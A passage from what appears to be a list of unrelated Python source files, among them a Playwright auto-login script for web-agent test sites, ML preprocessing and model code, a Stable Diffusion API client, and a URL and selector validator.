b18uS4VctJQe0feJ96GwCrxLAn0GJcxIDfRTOPVOa+1Qyol1dtG2lMYFZzetEnUQrHrlACnoZqWGj/r3A39J9KqqwmZvCiTQ9ivP9hAh9zUEFKrR6MOjv5P/YBhUZ7OOCK28hM8nDLOAvPUmSu4Zp+0jQZwry+UiLzKJg5wvOH5/H/V2Nh6DJ5oI79G4vZ4ezkrmnFXwzuKOrCo8mMqxE4CBHPDHUtav+0T+YteLSdxTDNN1CWuy5JeBtlEEfLUZwk3q0Usci88AucRR5hGwC+FGUwlOfWEM1mF3nLMPsMHdExE/Fd4C5ThLEubBE8f18y0NSKiLKejOkCSISsjfk018JkseKDBLd9I+556zc4ubYY9mFWbbaMZgS9kbknvi8WFz91IpzlJopCf3iChqdxnQRhWSoJseJK0lKaqNT4OCBKWHSHFMJge1DGKd+WUNxTLIiL7m3+oDYQez5kVINtTv20AUFeq4z4t1jl+Gxp+yn3KSTRcdJXlcCeXvLWWymR3RNALd8C1hrw7VzuA405zx+PlQBnsStt3CgNhdHd3cr9/P0CeFLlP4jcN7Fke6pzLV3aMvmo+TTotqSkttOAsJNt/Is/qymS7KN59HP0q0Q2za8ovicWCR1gwZpiAhqLYbEz4qHJJZqszfb3sFQhMq86w69EzYn/Nn0Qafq7kqYT4MZw6hCzRfiOVAet6GBLEYIOtDV59wCF0JrkdooqmVgIEbUSrq/ZEjknFU3UygZT4/X1E9FcRbEjfnuFieNRHFa5APPKlpRgz8mMZJFN3H501VUVXIICCnqCw4WrJ4iN3STRkkBtWbHImG+twiUAYZhhT84lAIXFRExxmvR4wzTzzdgDoKjMSfVWJ1LMosNbyWBquh4XjJ+QtEkkW4/ZVIU2YOlxlpw8IJdkJ4bfbE4pYUVmytVCpccgDECPZRFcL/+Q0sgvacvJG4s6wOKeB7MooY5vhr6agvU22EKQMB/9VECwkahzkDWfJ2MZTW6meo51OgjpennPIrkZh4PjOu46NLqI7DOHo9jd+jNUWbKrhwXncsICalA+Pl7CawupmhjFspSC+1dAjU118oAxJeDfDNGO6qaUAu0EmIQ7YwWhviBNyf+kApQ",
    "\"\"\"Script to automatically login each website\"\"\"\nimport argparse\nimport glob\nimport os\nimport time\nfrom concurrent.futures import ThreadPoolExecutor\nfrom itertools import combinations\nfrom pathlib import Path\n\nfrom playwright.sync_api import sync_playwright\n\nfrom browser_env.env_config import (\n    ACCOUNTS,\n    GITLAB,\n    REDDIT,\n    SHOPPING,\n    SHOPPING_ADMIN,\n)\n\nHEADLESS = True\nSLOW_MO = 0\n\n\nSITES = [\"gitlab\", \"shopping\", \"shopping_admin\", \"reddit\"]\nURLS = [\n    f\"{GITLAB}/-/profile\",\n    f\"{SHOPPING}/wishlist/\",\n    f\"{SHOPPING_ADMIN}/dashboard\",\n    f\"{REDDIT}/user/{ACCOUNTS['reddit']['username']}/account\",\n]\nEXACT_MATCH = [True, True, True, True]\nKEYWORDS = [\"\", \"\", \"Dashboard\", \"Delete\"]\n\n\ndef is_expired(\n    storage_state: Path, url: str, keyword: str, url_exact: bool = True\n) -> bool:\n    \"\"\"Test whether the cookie is expired\"\"\"\n    if not storage_state.exists():\n        return True\n\n    context_manager = sync_playwright()\n    playwright = context_manager.__enter__()\n    browser = playwright.chromium.launch(headless=True, slow_mo=SLOW_MO)\n    context = browser.new_context(storage_state=storage_state)\n    page = context.new_page()\n    page.goto(url)\n    time.sleep(1)\n    d_url = page.url\n    content = page.content()\n    context_manager.__exit__()\n    if keyword:\n        return keyword not in content\n    else:\n        if url_exact:\n            return d_url != url\n        else:\n            return url not in d_url\n\n\ndef renew_comb(comb: list[str], auth_folder: str = \"./.auth\") -> None:\n    context_manager = sync_playwright()\n    playwright = context_manager.__enter__()\n    browser = playwright.chromium.launch(headless=HEADLESS)\n    context = browser.new_context()\n    page = context.new_page()\n\n    if \"shopping\" in comb:\n        username = ACCOUNTS[\"shopping\"][\"username\"]\n        password = ACCOUNTS[\"shopping\"][\"password\"]\n        page.goto(f\"{SHOPPING}/customer/account/login/\")\n        page.get_by_label(\"Email\", exact=True).fill(username)\n        page.get_by_label(\"Password\", exact=True).fill(password)\n        page.get_by_role(\"button\", name=\"Sign In\").click()\n\n    if \"reddit\" in comb:\n        username = ACCOUNTS[\"reddit\"][\"username\"]\n        password = ACCOUNTS[\"reddit\"][\"password\"]\n        page.goto(f\"{REDDIT}/login\")\n        page.get_by_label(\"Username\").fill(username)\n        page.get_by_label(\"Password\").fill(password)\n        page.get_by_role(\"button\", name=\"Log in\").click()\n\n    if \"shopping_admin\" in comb:\n        username = ACCOUNTS[\"shopping_admin\"][\"username\"]\n        password = ACCOUNTS[\"shopping_admin\"][\"password\"]\n        page.goto(f\"{SHOPPING_ADMIN}\")\n        page.get_by_placeholder(\"user name\").fill(username)\n        page.get_by_placeholder(\"password\").fill(password)\n        page.get_by_role(\"button\", name=\"Sign in\").click()\n\n    if \"gitlab\" in comb:\n        username = ACCOUNTS[\"gitlab\"][\"username\"]\n        password = ACCOUNTS[\"gitlab\"][\"password\"]\n        page.goto(f\"{GITLAB}/users/sign_in\")\n        page.get_by_test_id(\"username-field\").click()\n        page.get_by_test_id(\"username-field\").fill(username)\n        page.get_by_test_id(\"username-field\").press(\"Tab\")\n        page.get_by_test_id(\"password-field\").fill(password)\n        page.get_by_test_id(\"sign-in-button\").click()\n\n    context.storage_state(path=f\"{auth_folder}/{'.'.join(comb)}_state.json\")\n\n    context_manager.__exit__()\n\n\ndef get_site_comb_from_filepath(file_path: str) -> list[str]:\n    comb = os.path.basename(file_path).rsplit(\"_\", 1)[0].split(\".\")\n    return comb\n\n\ndef main(auth_folder: str = \"./.auth\") -> None:\n    pairs = list(combinations(SITES, 2))\n\n    max_workers = 8\n    with ThreadPoolExecutor(max_workers=max_workers) as executor:\n        for pair in pairs:\n            # TODO[shuyanzh] auth don't work on these two sites\n            if \"reddit\" in pair and (\n                \"shopping\" in pair or \"shopping_admin\" in pair\n            ):\n                continue\n            executor.submit(\n                renew_comb, list(sorted(pair)), auth_folder=auth_folder\n            )\n\n        for site in SITES:\n            executor.submit(renew_comb, [site], auth_folder=auth_folder)\n\n    futures = []\n    cookie_files = list(glob.glob(f\"{auth_folder}/*.json\"))\n    with ThreadPoolExecutor(max_workers=max_workers) as executor:\n        for c_file in cookie_files:\n            comb = get_site_comb_from_filepath(c_file)\n            for cur_site in comb:\n                url = URLS[SITES.index(cur_site)]\n                keyword = KEYWORDS[SITES.index(cur_site)]\n                match = EXACT_MATCH[SITES.index(cur_site)]\n                future = executor.submit(\n                    is_expired, Path(c_file), url, keyword, match\n                )\n                futures.append(future)\n\n    for i, future in enumerate(futures):\n        assert not future.result(), f\"Cookie {cookie_files[i]} expired.\"\n\n\nif __name__ == \"__main__\":\n    parser = argparse.ArgumentParser()\n    parser.add_argument(\"--site_list\", nargs=\"+\", default=[])\n    parser.",
    "import argparse\nimport os\nimport subprocess\nimport yaml\nfrom preprocessing.main_preprocessing import add_config_paths\n\n\nif __name__ == \"__main__\":\n    parser = argparse.ArgumentParser()\n    parser.add_argument(\"--config\", type=str, required=True, help=\"Config path\")\n    parser.add_argument(\"--data-path\", default=\"./dataset/libby\", type=str)\n\n    args = parser.parse_args()\n    with open(args.config, \"r\") as f:\n        config = yaml.safe_load(f.read())\n        config = add_config_paths(args.data_path, config)\n    \n    dino_bb_dir = config['dino_bb_dir']\n    dino_bb_path = os.path.join(dino_bb_dir, \"dino_best_buddies.pt\")\n    dino_bb_filtered_path = os.path.join(dino_bb_dir, \"dino_best_buddies_filtered.pt\")\n    traj_path = config['unfiltered_trajectories_file']\n    dino_emb_path = config['dino_embed_video_path']\n    dino_bb_stride = config['dino_stride']\n    box_size = config['dino_bb_box_size']\n    iou_thresh = config['dino_bb_iou_threshold']\n    h, w = config['video_resh'], config['video_resw']\n    \n    # 1. extract_dino_feature_best_buddies.py\n    args_list = ['python', 'preprocessing_dino_bb/extract_dino_best_buddies.py', \n                    '--dino-emb-path', dino_emb_path, '--stride', str(dino_bb_stride), '--out-path', dino_bb_path, '--h', str(h), '--w', str(w)]\n    print(f\"----- Running {' '.join(args_list)}\", flush=True)\n    subprocess.run(args_list)\n\n    # 2. compute raft optical flows trajectories without direct flow filtering, used for DINO-BB filtering\n    args_list = ['python', './preprocessing/extract_trajectories.py', \n                    '--frames-path', config['video_folder'], '--output-path', traj_path, '--min-trajectory-length', str(config['min_trajectory_length']),\n                    '--threshold', str(config['threshold']), '--infer-res-size', str(h), str(w)]\n    print(f\"----- Running {' '.join(args_list)}\", flush=True)\n    subprocess.run(args_list)\n\n    # 3. of_filter_dino_feature_best_buddies.py\n    args_list = ['python', 'preprocessing_dino_bb/of_filter_dino_best_buddies.py',\n                    '--dino-bb-path', dino_bb_path, '--traj-path', traj_path, '--out-path', dino_bb_filtered_path, \n                    '--dino-bb-stride', str(dino_bb_stride), '--h', str(h), '--w', str(w)]\n    print(f\"----- Running {' '.join(args_list)}\", flush=True)\n    subprocess.run(args_list)\n\n    # 4. extract_bb_nms.py\n    args_list = ['python', 'preprocessing_dino_bb/compute_dino_bb_nms.py', \n                 '--dino-bb-path', dino_bb_filtered_path, '--dino-emb-path', dino_emb_path, '--out-path', dino_bb_filtered_path,\n                 '--stride', str(dino_bb_stride), '--box-size', str(box_size), '--iou-thresh', str(iou_thresh)]\n    print(f\"----- Running {' '.join(args_list)}\", flush=True)\n    subprocess.run(args_list)",
    "from diffusers import AutoencoderKL\nimport torch\nimport torchvision.transforms as transforms\nimport torch.nn.functional as F\nimport cv2\nimport numpy as np\nfrom PIL import Image\nimport os\n\nclass VAE():\n    \"\"\"\n    VAE (Variational Autoencoder) class for image processing.\n    \"\"\"\n\n    def __init__(self, model_path=\"./models/sd-vae-ft-mse/\", resized_img=256, use_float16=False):\n        \"\"\"\n        Initialize the VAE instance.\n\n        :param model_path: Path to the trained model.\n        :param resized_img: The size to which images are resized.\n        :param use_float16: Whether to use float16 precision.\n        \"\"\"\n        self.model_path = model_path\n        self.vae = AutoencoderKL.from_pretrained(self.model_path)\n\n        self.device = torch.device(\"cuda\" if torch.cuda.is_available() else \"cpu\")\n        self.vae.to(self.device)\n\n        if use_float16:\n            self.vae = self.vae.half()\n            self._use_float16 = True\n        else:\n            self._use_float16 = False\n\n        self.scaling_factor = self.vae.config.scaling_factor\n        self.transform = transforms.Normalize(mean=[0.5, 0.5, 0.5], std=[0.5, 0.5, 0.5])\n        self._resized_img = resized_img\n        self._mask_tensor = self.get_mask_tensor()\n        \n    def get_mask_tensor(self):\n        \"\"\"\n        Creates a mask tensor for image processing.\n        :return: A mask tensor.\n        \"\"\"\n        mask_tensor = torch.zeros((self._resized_img,self._resized_img))\n        mask_tensor[:self._resized_img//2,:] = 1\n        mask_tensor[mask_tensor< 0.5] = 0\n        mask_tensor[mask_tensor>= 0.5] = 1\n        return mask_tensor\n            \n    def preprocess_img(self,img_name,half_mask=False):\n        \"\"\"\n        Preprocess an image for the VAE.\n\n        :param img_name: The image file path or a list of image file paths.\n        :param half_mask: Whether to apply a half mask to the image.\n        :return: A preprocessed image tensor.\n        \"\"\"\n        window = []\n        if isinstance(img_name, str):\n            window_fnames = [img_name]\n            for fname in window_fnames:\n                img = cv2.imread(fname)\n                img = cv2.cvtColor(img, cv2.COLOR_BGR2RGB)\n                img = cv2.resize(img, (self._resized_img, self._resized_img),\n                                     interpolation=cv2.INTER_LANCZOS4)\n                window.append(img)\n        else:\n            img = cv2.cvtColor(img_name, cv2.COLOR_BGR2RGB)\n            window.append(img)\n            \n        x = np.asarray(window) / 255.\n        x = np.transpose(x, (3, 0, 1, 2))\n        x = torch.squeeze(torch.FloatTensor(x))\n        if half_mask:\n            x = x * (self._mask_tensor>0.5)\n        x = self.transform(x)\n        \n        x = x.unsqueeze(0) # [1, 3, 256, 256] torch tensor\n        x = x.to(self.vae.device)\n\n        return x\n\n    def encode_latents(self,image):\n        \"\"\"\n        Encode an image into latent variables.\n\n        :param image: The image tensor to encode.\n        :return: The encoded latent variables.\n        \"\"\"\n        with torch.no_grad():\n            init_latent_dist = self.vae.encode(image.to(self.vae.dtype)).latent_dist\n        init_latents = self.scaling_factor * init_latent_dist.sample()\n        return init_latents\n    \n    def decode_latents(self, latents):\n        \"\"\"\n        Decode latent variables back into an image.\n        :param latents: The latent variables to decode.\n        :return: A NumPy array representing the decoded image.\n        \"\"\"\n        latents = (1/  self.scaling_factor) * latents\n        image = self.vae.decode(latents.to(self.vae.dtype)).sample\n        image = (image / 2 + 0.5).clamp(0, 1)\n        image = image.detach().cpu().permute(0, 2, 3, 1).float().numpy()\n        image = (image * 255).round().astype(\"uint8\")\n        image = image[...,::-1] # RGB to BGR\n        return image\n    \n    def get_latents_for_unet(self,img):\n        \"\"\"\n        Prepare latent variables for a U-Net model.\n        :param img: The image to process.\n        :return: A concatenated tensor of latents for U-Net input.\n        \"\"\"\n        \n        ref_image = self.preprocess_img(img,half_mask=True) # [1, 3, 256, 256] RGB, torch tensor\n        masked_latents = self.encode_latents(ref_image) # [1, 4, 32, 32], torch tensor\n        ref_image = self.preprocess_img(img,half_mask=False) # [1, 3, 256, 256] RGB, torch tensor\n        ref_latents = self.encode_latents(ref_image) # [1, 4, 32, 32], torch tensor\n        latent_model_input = torch.cat([masked_latents, ref_latents], dim=1)\n        return latent_model_input\n\nif __name__ == \"__main__\":\n    vae_mode_path = \"./models/sd-vae-ft-mse/\"\n    vae = VAE(model_path = vae_mode_path,use_float16=False)\n    img_path = \"./results/sun001_crop/00000.png\"\n    \n    crop_imgs_path = \"./results/sun001_crop/\"\n    latents_out_path = \"./results/latents/\"\n    if not os.path.exists(latents_out_path):\n        os.mkdir(latents_out_path)\n\n    files = os.listdir(crop_imgs_path)\n    files.sort()\n    files = [file for fi",
    "# FCN model\n# when tuning start with learning rate->mini_batch_size ->\n# momentum-> #hidden_units -> # learning_rate_decay -> #layers\nimport tensorflow.keras as keras\nimport numpy as np\nfrom sklearn.model_selection import train_test_split\nimport time\nimport tensorflow as tf\nfrom utils.utils import save_logs\nfrom utils.utils import calculate_metrics\n\n\nclass Classifier_MCDCNN:\n\n    def __init__(self, output_directory, input_shape, nb_classes, verbose=False,build=True):\n        self.output_directory = output_directory\n        if build == True:\n            self.model = self.build_model(input_shape, nb_classes)\n            if (verbose == True):\n                self.model.summary()\n            self.verbose = verbose\n            self.model.save_weights(self.output_directory + 'model_init.hdf5')\n        return\n\n    def build_model(self, input_shape, nb_classes):\n        n_t = input_shape[0]\n        n_vars = input_shape[1]\n\n        padding = 'valid'\n\n        if n_t < 60: # for ItalyPowerOndemand\n            padding = 'same'\n\n        input_layers = []\n        conv2_layers = []\n\n        for n_var in range(n_vars):\n            input_layer = keras.layers.Input((n_t,1))\n            input_layers.append(input_layer)\n\n            conv1_layer = keras.layers.Conv1D(filters=8,kernel_size=5,activation='relu',padding=padding)(input_layer)\n            conv1_layer = keras.layers.MaxPooling1D(pool_size=2)(conv1_layer)\n\n            conv2_layer = keras.layers.Conv1D(filters=8,kernel_size=5,activation='relu',padding=padding)(conv1_layer)\n            conv2_layer = keras.layers.MaxPooling1D(pool_size=2)(conv2_layer)\n            conv2_layer = keras.layers.Flatten()(conv2_layer)\n\n            conv2_layers.append(conv2_layer)\n\n        if n_vars == 1:\n            # to work with univariate time series\n            concat_layer = conv2_layers[0]\n        else:\n            concat_layer = keras.layers.Concatenate(axis=-1)(conv2_layers)\n\n        fully_connected = keras.layers.Dense(units=732,activation='relu')(concat_layer)\n\n        output_layer = keras.layers.Dense(nb_classes, activation='softmax')(fully_connected)\n\n        model = keras.models.Model(inputs=input_layers, outputs=output_layer)\n\n        model.compile(loss='categorical_crossentropy', optimizer=keras.optimizers.SGD(lr=0.01,momentum=0.9,decay=0.0005),\n                      metrics=['accuracy'])\n\n        file_path = self.output_directory + 'best_model.hdf5'\n\n        model_checkpoint = keras.callbacks.ModelCheckpoint(filepath=file_path, monitor='val_loss',\n                                                           save_best_only=True)\n\n        self.callbacks = [model_checkpoint]\n\n        return model\n\n    def prepare_input(self,x):\n        new_x = []\n        n_t = x.shape[1]\n        n_vars = x.shape[2]\n\n        for i in range(n_vars):\n            new_x.append(x[:,:,i:i+1])\n\n        return  new_x\n\n    def fit(self, x, y, x_test, y_test, y_true):\n        if not tf.test.is_gpu_available:\n            print('error')\n            exit()\n        mini_batch_size = 16\n        nb_epochs = 120\n\n        x_train, x_val, y_train, y_val = \\\n            train_test_split(x, y, test_size=0.33)\n\n        x_test = self.prepare_input(x_test)\n        x_train = self.prepare_input(x_train)\n        x_val = self.prepare_input(x_val)\n\n        start_time = time.time()\n\n        hist = self.model.fit(x_train, y_train, batch_size=mini_batch_size, epochs=nb_epochs,\n                              verbose=self.verbose, validation_data=(x_val, y_val), callbacks=self.callbacks)\n\n        duration = time.time() - start_time\n\n        self.model.save(self.output_directory+'last_model.hdf5')\n\n        model = keras.models.load_model(self.output_directory + 'best_model.hdf5')\n\n        y_pred = model.predict(x_test)\n\n        # convert the predicted from binary to integer\n        y_pred = np.argmax(y_pred, axis=1)\n\n        save_logs(self.output_directory, hist, y_pred, y_true, duration,lr=False)\n\n        keras.backend.clear_session()\n\n    def predict(self, x_test,y_true,x_train,y_train,y_test,return_df_metrics = True):\n        model_path = self.output_directory + 'best_model.hdf5'\n        model = keras.models.load_model(model_path)\n        y_pred = model.predict(self.prepare_input(x_test))\n        if return_df_metrics:\n            y_pred = np.argmax(y_pred, axis=1)\n            df_metrics = calculate_metrics(y_true, y_pred, 0.0)\n            return df_metrics\n        else:\n            return y_pred",
    "# coding=utf-8\n# Copyright 2024 JetMoE AI and the HuggingFace Inc. team. All rights reserved.\n#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n# distributed under the License is distributed on an \"AS IS\" BASIS,\n# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n# See the License for the specific language governing permissions and\n# limitations under the License.\n\"\"\"PyTorch JetMoE model.\"\"\"\n\nimport math\nimport warnings\nfrom typing import List, Optional, Tuple, Union\n\nimport torch\nimport torch.utils.checkpoint\nfrom torch import nn\nfrom torch.nn import BCEWithLogitsLoss, CrossEntropyLoss, MSELoss\nfrom torch.nn import functional as F\n\nfrom transformers.activations import ACT2FN\nfrom transformers.cache_utils import Cache, DynamicCache\nfrom transformers.modeling_attn_mask_utils import (\n    _prepare_4d_causal_attention_mask,\n    _prepare_4d_causal_attention_mask_for_sdpa,\n)\nfrom transformers.modeling_outputs import (\n    BaseModelOutputWithPast,\n    CausalLMOutputWithPast,\n    SequenceClassifierOutputWithPast,\n    dataclass,\n)\nfrom transformers.modeling_utils import PreTrainedModel\nfrom transformers.utils import (\n    add_start_docstrings,\n    add_start_docstrings_to_model_forward,\n    is_flash_attn_2_available,\n    is_flash_attn_greater_or_equal_2_10,\n    logging,\n    replace_return_docstrings,\n)\nfrom .configuration_jetmoe import JetMoEConfig\nfrom .utils import MoE, ParallelExperts\n\n\nif is_flash_attn_2_available():\n    from flash_attn import flash_attn_func, flash_attn_varlen_func\n    from flash_attn.bert_padding import index_first_axis, pad_input, unpad_input  # noqa\n\nlogger = logging.get_logger(__name__)\n\n_CHECKPOINT_FOR_DOC = \"jetmoe\"\n_CONFIG_FOR_DOC = \"JetMoEConfig\"\n\n\n@dataclass\nclass JetMoEBaseModelOutputWithPast(BaseModelOutputWithPast):\n    \"\"\"\n    Base class for model's outputs that may also contain a past key/values (to speed up sequential decoding).\n\n    Args:\n        last_hidden_state (`torch.FloatTensor` of shape `(batch_size, sequence_length, hidden_size)`):\n            Sequence of hidden-states at the output of the last layer of the model.\n\n            If `past_key_values` is used only the last hidden-state of the sequences of shape `(batch_size, 1,\n            hidden_size)` is output.\n        past_key_values (`tuple(tuple(torch.FloatTensor))`, *optional*, returned when `use_cache=True` is passed or when `config.use_cache=True`):\n            Tuple of `tuple(torch.FloatTensor)` of length `config.n_layers`, with each tuple having 2 tensors of shape\n            `(batch_size, num_heads, sequence_length, embed_size_per_head)`) and optionally if\n            `config.is_encoder_decoder=True` 2 additional tensors of shape `(batch_size, num_heads,\n            encoder_sequence_length, embed_size_per_head)`.\n\n            Contains pre-computed hidden-states (key and values in the self-attention blocks and optionally if\n            `config.is_encoder_decoder=True` in the cross-attention blocks) that can be used (see `past_key_values`\n            input) to speed up sequential decoding.\n        hidden_states (`tuple(torch.FloatTensor)`, *optional*, returned when `output_hidden_states=True` is passed or when `config.output_hidden_states=True`):\n            Tuple of `torch.FloatTensor` (one for the output of the embeddings, if the model has an embedding layer, +\n            one for the output of each layer) of shape `(batch_size, sequence_length, hidden_size)`.\n\n            Hidden-states of the model at the output of each layer plus the optional initial embedding outputs.\n        attentions (`tuple(torch.FloatTensor)`, *optional*, returned when `output_attentions=True` is passed or when `config.output_attentions=True`):\n            Tuple of `torch.FloatTensor` (one for each layer) of shape `(batch_size, num_heads, sequence_length,\n            sequence_length)`.\n\n            Attentions weights after the attention softmax, used to compute the weighted average in the self-attention\n            heads.\n    \"\"\"\n\n    last_hidden_state: torch.FloatTensor = None\n    past_key_values: Optional[Tuple[Tuple[torch.FloatTensor]]] = None\n    hidden_states: Optional[Tuple[torch.FloatTensor]] = None\n    attentions: Optional[Tuple[torch.FloatTensor]] = None\n    aux_loss: Optional[torch.FloatTensor] = None\n\n\n@dataclass\nclass JetMoECausalLMOutputWithPast(CausalLMOutputWithPast):\n    \"\"\"\n    Base class for causal language model (or autoregressive) outputs.\n\n    Args:\n        loss (`torch.FloatTensor` of shape `(1,)`, *optional*, returned when `labels` is provided):\n            Language modeling loss (for next-token prediction).\n        logits (`torch.FloatTensor` of shape `(batch_size, sequence_length, config.vocab_size)`):\n            Prediction scores of the languag",
    "\ufeffimport requests\nimport json\nimport base64\nfrom datetime import datetime\nimport os\nimport itertools\nimport random\nimport re\nfrom PIL import Image, PngImagePlugin, ImageEnhance, ImageFilter, ImageOps\nimport io\nimport glob\nimport cv2\n\n\ndef build_payload(prompt, nega, w, h, unit1):\n    return {\n        \"prompt\": prompt,\n        \"negative_prompt\": nega,\n        \"seed\": -1,\n        \"sampler_name\": \"Euler a\",\n        \"steps\": 20,\n        \"cfg_scale\": 7,\n        \"width\": w,\n        \"height\": h,\n        \"alwayson_scripts\": {\"ControlNet\": {\"args\": [unit1]}},\n    }        \n\ndef send_post_request(url, payload):\n    headers = {\n        \"Content-Type\": \"application/json\"\n    }\n    response = requests.post(url, data=json.dumps(payload), headers=headers)\n    return response\n\n\ndef save_image(data, url, file_name):\n    image_string = data[\"images\"][0]\n    image_bytes = base64.b64decode(image_string)\n\n    png_payload = {\n        \"image\": \"data:image/png;base64,\" + image_string\n    }\n    response2 = requests.post(url=f'{url}/sdapi/v1/png-info', json=png_payload)\n    image_info = response2.json().get(\"info\")\n\n    image = Image.open(io.BytesIO(image_bytes))\n    pnginfo = PngImagePlugin.PngInfo()\n    if image_info:  # Ensure image_info is not None\n        pnginfo.add_text(\"parameters\", image_info)\n\n    image.save(file_name, pnginfo=pnginfo)\n    return image\n\n\ndef create_and_save_images(input_url, prompt, nega, canny_pil, lineart_fidelity, output_path):\n    url = f\"{input_url}/sdapi/v1/txt2img\"\n    w, h = canny_pil.size\n    canny_bytes = io.BytesIO()\n    canny_pil.save(canny_bytes, format='PNG')\n    encoded_canny = base64.b64encode(canny_bytes.getvalue()).decode('utf-8')\n    \n    prompt = \"masterpiece, best quality, SimplepositiveXLv1 <lora:sdxl-testlora-normalmap_04b_dim32:1.2>, \" + prompt\n    unit1 = {\n        \"image\": encoded_canny,\n        \"mask_image\": None,\n        \"control_mode\": \"Balanced\",\n        \"enabled\": True,\n        \"guidance_end\": 1,\n        \"guidance_start\": 0,\n        \"pixel_perfect\": True,\n        \"processor_res\": 1200,\n        \"resize_mode\": \"Just Resize\",  # \"Just Resize\", \"Crop and Resize\", \"Resize and Fill\"\n        \"threshold_a\": 64,\n        \"threshold_b\": 64,\n        \"weight\": lineart_fidelity,\n        \"module\": \"canny\",\n        \"model\": \"control-lora-canny-rank256 [ec2dbbe4]\",\n        \"save_detected_map\": None,\n        \"hr_option\": \"Both\"\n    }    \n\n\n    payload = build_payload(prompt, nega, w, h, unit1)\n    response = send_post_request(url, payload)\n    image_data = response.json()\n\n    if \"images\" in image_data and image_data[\"images\"]:\n        output_pil = save_image(image_data, input_url, output_path)\n        print(f\"Downloaded {output_path} to local\")\n        return output_pil\n    else:\n        print(\"Failed to generate image. 'images' key not found in the response.\")\n\ndef get_model(url):\n    sd_models = requests.get(f\"{url}/sdapi/v1/sd-models\").json()\n    sd_model_names = [i[\"title\"] for i in sd_models]\n    current_model_name = requests.get(f\"{url}/sdapi/v1/options\").json()[\"sd_model_checkpoint\"]\n    return sd_model_names, current_model_name\n\ndef get_controlnet_model(url):\n    cn_models = requests.get(f\"{url}/controlnet/model_list\").json()\n    return cn_models\n\ndef set_model(url, sd_model_name):\n    option_payload = {\n        \"sd_model_checkpoint\":sd_model_name,\n    }\n    response = requests.post(url=f'{url}/sdapi/v1/options', json=option_payload)",
    "import os\n\nimport torch\nfrom transformers import AutoModelForPreTraining, AutoTokenizer\n\nimport jiant.utils.python.io as py_io\nimport jiant.utils.zconf as zconf\n\n\n@zconf.run_config\nclass RunConfiguration(zconf.RunConfig):\n    hf_pretrained_model_name_or_path = zconf.attr(type=str)\n    output_base_path = zconf.attr(type=str)\n\n\ndef export_model(\n    hf_pretrained_model_name_or_path: str,\n    output_base_path: str,\n):\n    \"\"\"Retrieve model and tokenizer from Transformers and save all necessary data\n    Things saved:\n    - Model weights\n    - Model config JSON (corresponding to corresponding Transformers model Config object)\n    - Tokenizer data\n    - JSON file pointing to paths for the above\n    Args:\n        hf_pretrained_model_name_or_path (:obj:`str` or :obj:`os.PathLike`):\n                        Can be either:\n\n                            - A string, the `model id` of a pretrained model configuration\n                              hosted inside a model repo on okhuggingface.co.\n                              Valid model ids can be located at the root-level, like\n                              ``bert-base-uncased``, or namespaced under a user\n                              or organization name, like ``dbmdz/bert-base-german-cased``.\n                            - A path to a `directory` containing a configuration file saved using\n                              the :meth:`~transformers.PretrainedConfig.save_pretrained` method,\n                              or the\n                              :meth:`~transformers.PreTrainedModel.save_pretrained` method,\n                              e.g., ``./my_model_directory/``.\n                            - A path or url to a saved configuration JSON `file`, e.g.,\n                              ``./my_model_directory/configuration.json``.\n        output_base_path: Base path to save output to\n    \"\"\"\n    model = AutoModelForPreTraining.from_pretrained(hf_pretrained_model_name_or_path)\n\n    model_fol_path = os.path.join(output_base_path, \"model\")\n    model_path = os.path.join(model_fol_path, \"model.p\")\n    model_config_path = os.path.join(model_fol_path, \"config.json\")\n    tokenizer_fol_path = os.path.join(output_base_path, \"tokenizer\")\n\n    os.makedirs(tokenizer_fol_path, exist_ok=True)\n    os.makedirs(model_fol_path, exist_ok=True)\n\n    torch.save(model.state_dict(), model_path)\n    py_io.write_json(model.config.to_dict(), model_config_path)\n    tokenizer = AutoTokenizer.from_pretrained(hf_pretrained_model_name_or_path, use_fast=False)\n    tokenizer.save_pretrained(tokenizer_fol_path)\n    config = {\n        \"hf_pretrained_model_name_or_path\": hf_pretrained_model_name_or_path,\n        \"model_path\": model_path,\n        \"model_config_path\": model_config_path,\n    }\n    py_io.write_json(config, os.path.join(output_base_path, \"config.json\"))\n\n\ndef main():\n    args = RunConfiguration.default_run_cli()\n    export_model(\n        hf_pretrained_model_name_or_path=args.hf_pretrained_model_name_or_path,\n        output_base_path=args.output_base_path,\n    )\n\n\nif __name__ == \"__main__\":\n    main()\n",
    "import re\nfrom cssselect.parser import SelectorError\nfrom cssselect.xpath import HTMLTranslator\nfrom lxml import etree\n\n\nclass Valid(object):\n\n    uri_regex = re.compile(\n        r'^(?:http|ftp)s?://'  \n        r'(?:(?:[A-Z0-9](?:[A-Z0-9-]{0,61}[A-Z0-9])?\\.)+(?:[A-Z]{2,6}\\.?|[A-Z0-9-]{2,}\\.?)|'  \n        r'localhost|' \n        r'\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3})'  \n        r'(?::\\d+)?' \n        r'(?:/[^?#]*)?'  \n        r'(?:\\?[^#]+)?' \n        r'(?:#.*)?$', re.IGNORECASE)\n\n    @staticmethod\n    def is_valid_url(uri: str) -> bool:\n        return re.match(Valid.uri_regex, uri) is not None\n\n    @staticmethod\n    def is_valid_regex(pattern: str) -> bool:\n        try:\n            re.compile(pattern)\n            return True\n        except re.error:\n            return False\n\n    @staticmethod\n    def is_valid_xpath(xpath: str) -> bool:\n        try:\n            etree.XPath(xpath)\n            return True\n        except etree.XPathSyntaxError:\n            return False\n\n    @staticmethod\n    def is_valid_css(css: str) -> bool:\n        try:\n            HTMLTranslator().css_to_xpath(css)\n            return True\n        except SelectorError:\n            return False\n",
